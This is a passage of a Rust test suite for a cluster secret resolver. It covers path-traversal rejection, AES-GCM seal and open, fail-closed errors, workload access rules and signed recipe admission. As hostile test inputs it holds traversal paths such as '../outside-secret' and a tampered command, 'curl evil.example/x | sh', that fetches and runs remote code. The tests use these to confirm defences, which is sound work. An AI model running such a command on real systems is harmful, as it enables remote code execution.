            "../outside-secret",
            "/../outside-secret",
            "a/../../outside-secret",
        ] {
            let err = resolver
                .resolve(&SecretRef::LocalFile { path: evil.into() })
                .unwrap_err();
            assert!(
                matches!(err, SecretError::Io { .. }),
                "traversal {evil:?} must be rejected, got {err}"
            );
        }
        // A plain relative key still resolves normally.
        std::fs::write(root.join("ok-key"), b"fine").unwrap();
        assert_eq!(
            resolver
                .resolve(&SecretRef::LocalFile {
                    path: "ok-key".into()
                })
                .unwrap(),
            b"fine"
        );
    }

    #[test]
    fn local_file_resolver_not_found() {
        let tmp = tempfile::TempDir::new().unwrap();
        let resolver = LocalFileResolver::new(tmp.path());
        let err = resolver
            .resolve(&SecretRef::LocalFile {
                path: "nonexistent".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::NotFound { .. }),
            "expected NotFound, got {err}"
        );
    }

    // ── Cluster resolver (R600-F2) ──────────────────────────────────────────
    // The raw cipher is test-only here since R911-F4: production opens through
    // `workload_spec::secrets::open`. These fixtures seal with a FIXED nonce so
    // a test can reason about exact bytes, which the production seal never does.

    use aes_gcm::aead::{Aead, Payload};
    use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce};
    use std::collections::HashMap;

    /// The logical name the fixed-nonce fixtures are sealed under (R911-F4).
    const TEST_SECRET: &str = "tls/yah.dev";

    const TEST_KEK: [u8; 32] = [7u8; 32];
    const TEST_NONCE: [u8; 12] = [3u8; 12];
    // A realistic worked example: PEM cert material, the payload W273 targets.
    const TLS_PEM: &[u8] =
        b"-----BEGIN CERTIFICATE-----\nMIIB...fleet-shared\n-----END CERTIFICATE-----\n";

    /// The workload every fixture below deploys as. Both the sealed records and
    /// the resolvers are built for this identity, so the existing R600 tests run
    /// through the R706 access check rather than around it.
    const TEST_WORKLOAD: &str = "ingress";

    fn test_access() -> SecretAccess {
        SecretAccess::workloads([TEST_WORKLOAD])
    }

    fn test_consumer() -> SecretConsumer {
        SecretConsumer::workload(TEST_WORKLOAD)
    }

    /// AES-256-GCM-seal `plaintext` under `kek`/`nonce` into a `SecretRecord`
    /// admitting [`TEST_WORKLOAD`], mirroring what the F3 issuer writes into raft.
    fn seal(kek: &[u8; 32], nonce: &[u8; 12], plaintext: &[u8]) -> SecretRecord {
        seal_with(kek, nonce, plaintext, test_access())
    }

    fn seal_with(
        kek: &[u8; 32],
        nonce: &[u8; 12],
        plaintext: &[u8],
        access: SecretAccess,
    ) -> SecretRecord {
        seal_named(kek, nonce, TEST_SECRET, plaintext, access)
    }

    /// A fixed-nonce fixture sealed under `name` (R911-F4), for a test that
    /// resolves some name other than [`TEST_SECRET`].
    fn seal_named(
        kek: &[u8; 32],
        nonce: &[u8; 12],
        name: &str,
        plaintext: &[u8],
        access: SecretAccess,
    ) -> SecretRecord {
        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(kek));
        let aad = workload_spec::secrets::secret_aad(name, &access);
        let ciphertext = cipher
            .encrypt(
                Nonce::from_slice(nonce),
                Payload {
                    msg: plaintext,
                    aad: &aad,
                },
            )
            .expect("seal");
        SecretRecord {
            ciphertext,
            nonce: nonce.to_vec(),
            updated_at: 0,
            access,
            digest: None,
            sans: None,
            ari: None,
        }
    }

    /// In-memory `ClusterSecretStore` keyed on logical secret name.
    struct FakeClusterStore {
        secrets: HashMap<String, SecretRecord>,
    }

    impl FakeClusterStore {
        fn new() -> Self {
            Self {
                secrets: HashMap::new(),
            }
        }
        fn with(mut self, name: &str, rec: SecretRecord) -> Self {
            self.secrets.insert(name.to_string(), rec);
            self
        }
    }

    impl ClusterSecretStore for FakeClusterStore {
        fn get_secret(&self, name: &str) -> Result<Option<SecretRecord>, SecretStoreError> {
            Ok(self.secrets.get(name).cloned())
        }
    }

    /// A store that cannot answer at all.
    struct BrokenClusterStore;

    impl ClusterSecretStore for BrokenClusterStore {
        fn get_secret(&self, _name: &str) -> Result<Option<SecretRecord>, SecretStoreError> {
            Err(SecretStoreError::Backend(yah_object_store::Error::Backend(
                "connection reset".into(),
            )))
        }
    }

    /// R911-F1: an unanswerable store must surface as `ClusterUnavailable`,
    /// never `ClusterNotFound` — a caller that acts on absence (headscale's
    /// noise identity) would otherwise act on an outage.
    #[test]
    fn a_store_error_is_unavailable_not_absent() {
        let root = tempfile::TempDir::new().unwrap();
        let resolver = ClusterResolver::new(
            BrokenClusterStore,
            TEST_KEK,
            LocalFileResolver::new(root.path()),
            test_consumer(),
        );
        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::ClusterUnavailable { ref name } if name == "tls/yah.dev"),
            "got {err}"
        );
        assert!(!err.to_string().contains("connection reset"), "{err}");
        assert_ne!(
            err.to_string(),
            SecretError::ClusterNotFound {
                name: "tls/yah.dev".into()
            }
            .to_string()
        );
    }

    fn cluster_resolver(
        store: FakeClusterStore,
        kek: [u8; 32],
    ) -> ClusterResolver<FakeClusterStore> {
        // An empty local root — these tests only exercise the Cluster arm unless
        // they populate the store dir explicitly.
        let root = tempfile::TempDir::new().unwrap();
        ClusterResolver::new(
            store,
            kek,
            LocalFileResolver::new(root.path()),
            test_consumer(),
        )
    }

    #[test]
    fn cluster_secret_round_trips_to_plaintext() {
        let store =
            FakeClusterStore::new().with("tls/yah.dev", seal(&TEST_KEK, &TEST_NONCE, TLS_PEM));
        let resolver = cluster_resolver(store, TEST_KEK);

        // Direct resolve.
        let bytes = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap();
        assert_eq!(bytes, TLS_PEM, "cluster secret decrypts to original PEM");

        // And through resolve_secrets → a tmpfs File mount, the worked example.
        let mounts = vec![SecretMount {
            source: SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            },
            target: SecretTarget::File {
                path: "/run/secrets/tls.crt".into(),
                mode: 0o400,
            },
        }];
        let resolved = resolve_secrets(&mounts, &resolver).unwrap();
        assert_eq!(resolved.file_mounts.len(), 1);
        assert_eq!(resolved.file_mounts[0].content, TLS_PEM);
        assert_eq!(resolved.file_mounts[0].mode, 0o400);
    }

    #[test]
    fn cluster_wrong_kek_fails_closed() {
        let store =
            FakeClusterStore::new().with("tls/yah.dev", seal(&TEST_KEK, &TEST_NONCE, TLS_PEM));
        // Resolver holds a *different* KEK than the one used to seal.
        let resolver = cluster_resolver(store, [9u8; 32]);

        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::ClusterDecrypt { .. }),
            "wrong KEK must fail closed, got {err}"
        );
        // The error surface must not leak key or ciphertext bytes.
        let msg = err.to_string();
        assert!(msg.contains("tls/yah.dev"), "names the secret");
        assert!(!msg.contains('\u{7}'), "no raw KEK byte in message");
    }

    #[test]
    fn cluster_missing_secret_is_not_found() {
        let resolver = cluster_resolver(FakeClusterStore::new(), TEST_KEK);
        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/absent".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::ClusterNotFound { .. }),
            "absent secret must fail closed as NotFound, got {err}"
        );
    }

    #[test]
    fn cluster_tampered_ciphertext_fails_closed() {
        let mut rec = seal(&TEST_KEK, &TEST_NONCE, TLS_PEM);
        rec.ciphertext[0] ^= 0xff; // flip a byte → GCM tag check fails
        let store = FakeClusterStore::new().with("tls/yah.dev", rec);
        let resolver = cluster_resolver(store, TEST_KEK);

        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::ClusterDecrypt { .. }),
            "tampered ciphertext must fail closed, got {err}"
        );
    }

    #[test]
    fn cluster_malformed_nonce_fails_closed_without_panic() {
        let mut rec = seal(&TEST_KEK, &TEST_NONCE, TLS_PEM);
        rec.nonce = vec![1u8; 8]; // not 12 bytes
        let store = FakeClusterStore::new().with("tls/yah.dev", rec);
        let resolver = cluster_resolver(store, TEST_KEK);

        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::ClusterDecrypt { .. }),
            "malformed nonce must fail closed, got {err}"
        );
    }

    #[test]
    fn cluster_resolver_still_serves_local_file() {
        // The Cluster resolver must keep resolving LocalFile mounts (a node can
        // mix per-machine and cluster secrets on one workload).
        let tmp = tempfile::TempDir::new().unwrap();
        std::fs::write(tmp.path().join("api-key"), b"token123").unwrap();
        let resolver = ClusterResolver::new(
            FakeClusterStore::new(),
            TEST_KEK,
            LocalFileResolver::new(tmp.path()),
            test_consumer(),
        );

        let bytes = resolver
            .resolve(&SecretRef::LocalFile {
                path: "api-key".into(),
            })
            .unwrap();
        assert_eq!(bytes, b"token123");
    }

    #[test]
    fn cluster_resolver_debug_redacts_kek() {
        let resolver = cluster_resolver(FakeClusterStore::new(), TEST_KEK);
        let dbg = format!("{resolver:?}");
        assert!(dbg.contains("<redacted>"), "KEK must be redacted in Debug");
        assert!(!dbg.contains('\u{7}'), "no raw KEK byte in Debug output");
    }

    #[test]
    fn load_cluster_kek_reads_32_bytes() {
        let tmp = tempfile::TempDir::new().unwrap();
        let path = tmp.path().join("cluster.kek");
        std::fs::write(&path, [42u8; 32]).unwrap();
        assert_eq!(*load_cluster_kek(&path).unwrap(), [42u8; 32]);
    }

    #[test]
    fn load_cluster_kek_wrong_size_fails() {
        let tmp = tempfile::TempDir::new().unwrap();
        let path = tmp.path().join("cluster.kek");
        std::fs::write(&path, [1u8; 16]).unwrap(); // too short
        let err = load_cluster_kek(&path).unwrap_err();
        assert!(matches!(err, SecretError::Kek { .. }), "got {err}");
    }

    #[test]
    fn load_cluster_kek_missing_fails() {
        let tmp = tempfile::TempDir::new().unwrap();
        let err = load_cluster_kek(&tmp.path().join("nope.kek")).unwrap_err();
        assert!(matches!(err, SecretError::Kek { .. }), "got {err}");
    }

    // ── Seal (R600-F3) pairs with the resolver's open (R600-F2) ─────────────

    #[test]
    fn seal_then_resolver_open_round_trips() {
        // The issuer seals; a consumer node opens with the same KEK — the exact
        // fleet path (F3 write → raft → F2 read).
        let rec = seal_cluster_secret(&TEST_KEK, TEST_SECRET, TLS_PEM, 1234, test_access());
        assert_eq!(rec.nonce.len(), 12, "GCM nonce is 12 bytes");
        assert_eq!(rec.updated_at, 1234);
        assert_ne!(
            rec.ciphertext.as_slice(),
            TLS_PEM,
            "stored bytes are ciphertext"
        );

        let store = FakeClusterStore::new().with("tls/yah.dev", rec);
        let resolver = cluster_resolver(store, TEST_KEK);
        let opened = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap();
        assert_eq!(opened, TLS_PEM, "open reverses seal");
    }

    #[test]
    fn seal_draws_a_fresh_nonce_each_call() {
        // Re-sealing identical plaintext (a renewal) must never reuse a nonce.
        let a = seal_cluster_secret(&TEST_KEK, TEST_SECRET, TLS_PEM, 0, test_access());
        let b = seal_cluster_secret(&TEST_KEK, TEST_SECRET, TLS_PEM, 0, test_access());
        assert_ne!(a.nonce, b.nonce, "nonce must be random per seal");
        assert_ne!(
            a.ciphertext, b.ciphertext,
            "distinct nonce → distinct ciphertext"
        );
    }

    #[test]
    fn seal_under_one_kek_does_not_open_under_another() {
        // A record sealed with KEK-A must fail closed against KEK-B.
        let rec = seal_cluster_secret(&TEST_KEK, TEST_SECRET, TLS_PEM, 0, test_access());
        let store = FakeClusterStore::new().with("tls/yah.dev", rec);
        let resolver = cluster_resolver(store, [0x11u8; 32]);
        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::ClusterDecrypt { .. }),
            "got {err}"
        );
    }

    // ── Access rules (R706 / W294) ──────────────────────────────────────────

    /// Build a resolver for a workload *other* than the one the fixtures admit.
    fn resolver_for(store: FakeClusterStore, workload: &str) -> ClusterResolver<FakeClusterStore> {
        let root = tempfile::TempDir::new().unwrap();
        ClusterResolver::new(
            store,
            TEST_KEK,
            LocalFileResolver::new(root.path()),
            SecretConsumer::workload(workload),
        )
    }

    #[test]
    fn unadmitted_workload_is_refused() {
        // The record admits "ingress"; "impostor" names it and gets nothing.
        let store =
            FakeClusterStore::new().with("tls/yah.dev", seal(&TEST_KEK, &TEST_NONCE, TLS_PEM));
        let resolver = resolver_for(store, "impostor");

        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::Forbidden { .. }),
            "unadmitted workload must be refused, got {err}"
        );
    }

    #[test]
    fn refusal_is_indistinguishable_from_absence() {
        // The whole point of the Forbidden arm's duplicated message: a workload
        // spec must not be usable as an oracle for which secrets exist.
        let store =
            FakeClusterStore::new().with("tls/yah.dev", seal(&TEST_KEK, &TEST_NONCE, TLS_PEM));
        let denied = resolver_for(store, "impostor")
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err()
            .to_string();

        // Same probe against a name that genuinely doesn't exist.
        let absent = resolver_for(FakeClusterStore::new(), "impostor")
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err()
            .to_string();

        assert_eq!(
            denied, absent,
            "a denied read must be externally identical to a missing one"
        );
    }

    // ── Recipe rules end to end (R555-F5 / W235 §(c)) ───────────────────────

    /// The whole two-sided chain in one test, with a real signature: a recipe
    /// author signs a grant, the node verifies it against a pinned key, the
    /// verified recipe identity rides onto the `SecretConsumer`, and the vault
    /// record's own `Recipes` rule is what finally serves the bytes.
    ///
    /// Worth doing end to end rather than as four unit tests, because every
    /// link is in a different crate and the property only exists if all four
    /// hold at once — a run gets the R2 key because it *proved* it is the
    /// recipe that was granted one, not because it named the secret.
    fn signed_forge_spec(
        recipe: &str,
    ) -> (workload_spec::WorkloadSpec, String, ed25519_dalek::SigningKey) {
        use ed25519_dalek::SigningKey;

        let key = SigningKey::from_bytes(&[42u8; 32]);
        // Hand-rolled hex rather than pulling the `hex` crate in as a
        // dev-dependency for one line.
        let public: String = key
            .verifying_key()
            .to_bytes()
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect();
        let mut spec = workload_spec::WorkloadSpec::for_forge(
            "0193a7c2-9f11-7e3a-9c1e-2b0f4d8e6a55",
            workload_spec::ImageRef {
                registry: "ghcr.io".into(),
                repository: "yah-ai/builder".into(),
                tag: "v1".into(),
                digest: "sha256:".to_string() + &"a".repeat(64),
            },
            workload_spec::TierTag("infra".into()),
            vec![],
        );
        spec.command = Some(vec!["build-v8.sh".into()]);
        let grant = workload_spec::admission::AdmissionGrant::from_spec(recipe, &spec);
        let signature = workload_spec::admission::sign_grant(&grant.encode(), &key);
        workload_spec::admission::attach(&mut spec, &grant.encode(), &signature, &public);
        (spec, public, key)
    }

    #[test]
    fn a_signed_recipe_reads_the_credential_its_grant_names() {
        let (spec, public, _) = signed_forge_spec("rusty-v8-musl");

        // The node verifies against its pinned key set — this is the step that
        // turns an assertion in an annotation into an identity.
        let grant = workload_spec::admission::admit_grant(
            &spec,
            workload_spec::admission::Policy::Permissive,
            std::slice::from_ref(&public),
        )
        .expect("a correctly signed spec is admitted")
        .expect("and yields its grant");

        let consumer = crate::deploy::secret_mount::consumer_for(&spec, Some(&grant));
        let store = FakeClusterStore::new().with(
            "r2/write",
            seal_named(
                &TEST_KEK,
                &TEST_NONCE,
                "r2/write",
                b"r2-secret-bytes",
                SecretAccess::recipes([("rusty-v8-musl", public.as_str())]),
            ),
        );
        let root = tempfile::TempDir::new().unwrap();
        let resolver = ClusterResolver::new(
            store,
            TEST_KEK,
            LocalFileResolver::new(root.path()),
            consumer,
        );

        let bytes = resolver
            .resolve(&SecretRef::Cluster {
                name: "r2/write".into(),
            })
            .expect("the recipe rule admits this run");
        assert_eq!(bytes, b"r2-secret-bytes");
    }

    #[test]
    fn a_tampered_dispatch_gets_no_identity_and_therefore_no_credential() {
        let (mut spec, public, _) = signed_forge_spec("rusty-v8-musl");
        // Swap the argv under the signature — the classic tampering shape.
        spec.command = Some(vec!["curl evil.example/x | sh".into()]);

        assert!(
            workload_spec::admission::admit_grant(
                &spec,
                workload_spec::admission::Policy::Permissive,
                std::slice::from_ref(&public),
            )
            .is_err(),
            "coverage must catch the swapped argv"
        );

        // What the deploy handler then has is `None`, so no recipe identity.
        let consumer = crate::deploy::secret_mount::consumer_for(&spec, None);
        let store = FakeClusterStore::new().with(
            "r2/write",
            seal_with(
                &TEST_KEK,
                &TEST_NONCE,
                b"r2-secret-bytes",
                SecretAccess::recipes([("rusty-v8-musl", public.as_str())]),
            ),
        );
        let root = tempfile::TempDir::new().unwrap();
        let resolver = ClusterResolver::new(
            store,
            TEST_KEK,
            LocalFileResolver::new(root.path()),
            consumer,
        );

        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "r2/write".into(),
            })
            .unwrap_err();
        assert!(matches!(err, SecretError::Forbidden { .. }), "got {err}");
    }

    /// A run signed by a key the node pins, for a recipe the *secret* does not
    /// name, still gets nothing. Admission and access are two gates, not one.
    #[test]
    fn a_validly_signed_but_unnamed_recipe_is_still_refused() {
        let (spec, public, _) = signed_forge_spec("whisper-bundle-tar");
        let grant = workload_spec::admission::admit_grant(
            &spec,
            workload_spec::admission::Policy::Permissive,
            std::slice::from_ref(&public),
        )
        .unwrap()
        .unwrap();

        let consumer = crate::deploy::secret_mount::consumer_for(&spec, Some(&grant));
        let store = FakeClusterStore::new().with(
            "r2/write",
            seal_with(
                &TEST_KEK,
                &TEST_NONCE,
                b"r2-secret-bytes",
                SecretAccess::recipes([("rusty-v8-musl", public.as_str())]),
            ),
        );
        let root = tempfile::TempDir::new().unwrap();
        let resolver = ClusterResolver::new(
            store,
            TEST_KEK,
            LocalFileResolver::new(root.path()),
            consumer,
        );
        assert!(matches!(
            resolver
                .resolve(&SecretRef::Cluster {
                    name: "r2/write".into()
                })
                .unwrap_err(),
            SecretError::Forbidden { .. }
        ));
    }

    #[test]
    fn unruled_legacy_record_is_refused_not_granted() {
        // A record from before R706 carries no rule. It must fail CLOSED.
        // Built the way a legacy record actually arrives — deserialized from a
        // snapshot written without the field.
        let sealed = seal(&TEST_KEK, &TEST_NONCE, TLS_PEM);
        let legacy_json = serde_json::json!({
            "ciphertext": sealed.ciphertext,
            "nonce": sealed.nonce,
            "updated_at": 0,
        });
        let legacy: SecretRecord = serde_json::from_value(legacy_json).unwrap();
        assert_eq!(
            legacy.access,
            SecretAccess::default(),
            "missing field lands on the deny-all default"
        );

        // Even the workload the fixture normally admits gets nothing.
        let store = FakeClusterStore::new().with("tls/yah.dev", legacy);
        let err = cluster_resolver(store, TEST_KEK)
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::Forbidden { .. }),
            "an unruled legacy secret must be refused, got {err}"
        );
    }

    #[test]
    fn allow_any_serves_every_workload() {
        // The deliberate escape hatch still works — otherwise the fail-closed
        // default would have no usable release valve.
        let rec = seal_with(&TEST_KEK, &TEST_NONCE, TLS_PEM, SecretAccess::AllowAny);
        let store = FakeClusterStore::new().with("tls/yah.dev", rec);
        let bytes = resolver_for(store, "anybody-at-all")
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap();
        assert_eq!(bytes, TLS_PEM);
    }

    #[test]
    fn authorization_runs_before_decryption() {
        // Ordering pin: a denied read must not touch the KEK. Seal under KEK-A
        // and hand the resolver KEK-B — if the check ran *after* decrypt we'd
        // see ClusterDecrypt, and a denied caller would learn from the error
        // whether the node could have opened the record.
        let rec = seal(&TEST_KEK, &TEST_NONCE, TLS_PEM); // admits "ingress"
        let store = FakeClusterStore::new().with("tls/yah.dev", rec);
        let root = tempfile::TempDir::new().unwrap();
        let resolver = ClusterResolver::new(
            store,
            [0x11u8; 32], // wrong KEK
            LocalFileResolver::new(root.path()),
            SecretConsumer::workload("impostor"), // and unadmitted
        );

        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::Forbidden { .. }),
            "the rule check must short-circuit before the KEK is used, got {err}"
        );
    }

    #[test]
    fn a_different_tenant_is_a_different_consumer() {
        // Same workload name, different tenant → refused. Rule entries default
        // to the singleton tenant, and that default narrows rather than widens.
        let store =
            FakeClusterStore::new().with("tls/yah.dev", seal(&TEST_KEK, &TEST_NONCE, TLS_PEM));
        let root = tempfile::TempDir::new().unwrap();
        let resolver = ClusterResolver::new(
            store,
            TEST_KEK,
            LocalFileResolver::new(root.path()),
            SecretConsumer {
                workload: TEST_WORKLOAD.into(),
                tenant: workload_spec::TenantId("acme".into()),
                namespace: workload_spec::NamespaceId::singleton(),
                recipe: None,
            },
        );

        let err = resolver
            .resolve(&SecretRef::Cluster {
                name: "tls/yah.dev".into(),
            })
            .unwrap_err();
        assert!(matches!(err, SecretError::Forbidden { .. }), "got {err}");
    }

    /// R911-F4: a bucket writer widens a record's rule to admit an impostor.
    /// The access check trusts the rule on the record, so it passes — and then
    /// the AEAD tag fails, because the rule was bound into the seal. The
    /// refusal is `ClusterDecrypt`, fail-closed, and names only the secret.
    #[test]
    fn a_widened_access_rule_passes_the_check_and_fails_the_tag() {
        let mut rec = seal(&TEST_KEK, &TEST_NONCE, TLS_PEM); // admits "ingress" only
        rec.access = SecretAccess::AllowAny;
        let store = FakeClusterStore::new().with(TEST_SECRET, rec);
        let err = resolver_for(store, "impostor")
            .resolve(&SecretRef::Cluster {
                name: TEST_SECRET.into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::ClusterDecrypt { ref name } if name == TEST_SECRET),
            "a widened rule must fail the tag, got {err}"
        );
        assert!(!err.to_string().contains("impostor"), "{err}");
    }

    /// R911-F4: a ciphertext copied under another name — even one the consumer
    /// is admitted to — does not open there.
    #[test]
    fn a_record_copied_under_another_name_fails_the_tag() {
        let rec = seal(&TEST_KEK, &TEST_NONCE, TLS_PEM);
        let store = FakeClusterStore::new().with("tls/other.dev", rec);
        let err = cluster_resolver(store, TEST_KEK)
            .resolve(&SecretRef::Cluster {
                name: "tls/other.dev".into(),
            })
            .unwrap_err();
        assert!(
            matches!(err, SecretError::ClusterDecrypt { .. }),
            "a moved ciphertext must fail the tag, got {err}"
        );
    }

    /// R911-F4: a record sealed the pre-F4 way (no associated data) no longer
    /// opens through the resolver. R911-F5 migrates those records.
    #[test]
    fn a_pre_r911_f4_unbound_record_does_not_open() {
        let legacy = workload_spec::secrets::seal(&TEST_KEK, TLS_PEM, &[]);
        let rec = SecretRecord {
            ciphertext: legacy.ciphertext,
            nonce: legacy.nonce,
            updated_at: 0,
            access: test_access(),
            digest: None,
            sans: None,
            ari: None,
        };
        let store = FakeClusterStore::new().with(TEST_SECRET, rec);
        let err = cluster_resolver(store, TEST_KEK)
            .resolve(&SecretRef::Cluster {
                name: TEST_SECRET.into(),
            })
            .unwrap_err();
        assert!(matches!(err, SecretError::ClusterDecrypt { .. }), "got {err}");
    }

    #[test]
    fn local_file_secrets_are_not_subject_to_cluster_rules() {
        // Access rules guard the *cluster* store. Per-machine LocalFile secrets
        // are already scoped by being on that machine's disk; an unadmitted
        // consumer identity must not start failing them.
        let tmp = tempfile::TempDir::new().unwrap();
        std::fs::write(tmp.path().join("api-key"), b"token123").unwrap();
        let resolver = ClusterResolver::new(
            FakeClusterStore::new(),
            TEST_KEK,
            LocalFileResolver::new(tmp.path()),
            SecretConsumer::workload("some-other-workload"),
        );

        let bytes = resolver
            .resolve(&SecretRef::LocalFile {
                path: "api-key".into(),
            })
            .unwrap();
        assert_eq!(bytes, b"token123");
    }
}
